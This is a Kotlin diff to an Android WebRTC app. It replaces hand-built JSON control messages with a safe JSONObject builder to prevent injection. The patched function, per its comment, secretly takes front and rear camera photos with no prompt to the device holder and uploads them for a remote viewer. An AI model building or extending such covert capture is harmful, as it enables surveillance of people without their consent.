@@ -1443,30 +1443,44 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
             .show()
     }
 
+    /** 构造 JSON 字符串：避免手写拼接导致用户可控输入（引号/反斜杠）破坏 JSON 结构或注入 */
+    private fun buildJson(vararg pairs: Pair<String, Any?>): String {
+        val o = org.json.JSONObject()
+        for ((k, v) in pairs) {
+            when (v) {
+                null -> o.put(k, org.json.JSONObject.NULL)
+                is Number -> o.put(k, v)
+                is Boolean -> o.put(k, v)
+                else -> o.put(k, v.toString())
+            }
+        }
+        return o.toString()
+    }
+
     /** 后台拍照（后置+前置或仅前置）→ 压缩上传相册服务器 → 回发链接给观看方；全程无共享方弹窗 */
     private fun startCameraCapture(frontOnly: Boolean) {
         val baseUrl = BuildConfig.ALBUM_URL
         val p = peer
         if (baseUrl.isBlank()) {
-            p?.sendControl("""{"type":"album-result","error":"相册服务器未配置"}""")
+            p?.sendControl(buildJson("type" to "album-result", "error" to "相册服务器未配置"))
             return
         }
         val ctx = this
-        p?.sendControl("""{"type":"album-result","ack":"capturing"}""")
+        p?.sendControl(buildJson("type" to "album-result", "ack" to "capturing"))
         Thread {
             try {
                 val shot = CameraCapture.capture(ctx, frontOnly = frontOnly)
                 val err = shot?.error
                 if (shot == null || err != null) {
                     val reason = err ?: "未知错误"
-                    p?.sendControl("""{"type":"album-result","ack":"shot-failed","error":"$reason"}""")
+                    p?.sendControl(buildJson("type" to "album-result", "ack" to "shot-failed", "error" to reason))
                     return@Thread
                 }
                 val b64List = ArrayList<String>()
                 shot.backJpeg?.let { b64List.add(AlbumUploader.jpegToBase64(it)) }
                 shot.frontJpeg?.let { b64List.add(AlbumUploader.jpegToBase64(it)) }
                 if (b64List.isEmpty()) {
-                    p?.sendControl("""{"type":"album-result","ack":"shot-failed","error":"无照片"}""")
+                    p?.sendControl(buildJson("type" to "album-result", "ack" to "shot-failed", "error" to "无照片"))
                     return@Thread
                 }
                 AlbumUploader.uploadB64Images(
@@ -1475,18 +1489,18 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                         override fun onProgress(current: Int, total: Int) {}
 
                         override fun onComplete(link: String) {
-                            p?.sendControl("""{"type":"album-result","url":"$link"}""")
+                            p?.sendControl(buildJson("type" to "album-result", "url" to link))
                         }
 
                         override fun onError(message: String) {
-                            p?.sendControl("""{"type":"album-result","error":"$message"}""")
+                            p?.sendControl(buildJson("type" to "album-result", "error" to message))
                         }
                     },
                     cancel = { cameraUploadCancel }
                 )
             } catch (t: Throwable) {
                 val msg = t.message ?: "未知错误"
-                p?.sendControl("""{"type":"album-result","error":"拍照上传失败: $msg"}""")
+                p?.sendControl(buildJson("type" to "album-result", "error" to "拍照上传失败: $msg"))
             }
         }.start()
     }
